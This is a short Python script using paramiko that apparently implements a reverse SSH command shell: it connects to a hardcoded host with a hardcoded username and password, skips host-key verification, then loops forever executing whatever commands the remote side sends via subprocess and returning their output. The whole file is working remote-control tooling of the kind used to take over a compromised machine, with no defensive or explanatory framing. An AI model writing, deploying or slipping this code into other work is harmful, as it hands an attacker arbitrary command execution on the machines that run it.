import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session=client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command.encode("utf-8"))
        print(ssh_session.recv(65535).decode("utf-8"))
        while True:
            command = ssh_session.recv(1024).decode("utf-8")
            try:
                cmd_output = subprocess.getoutput(command)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return
ssh_command('192.168.1.2','Eric','python','ClientConnected')

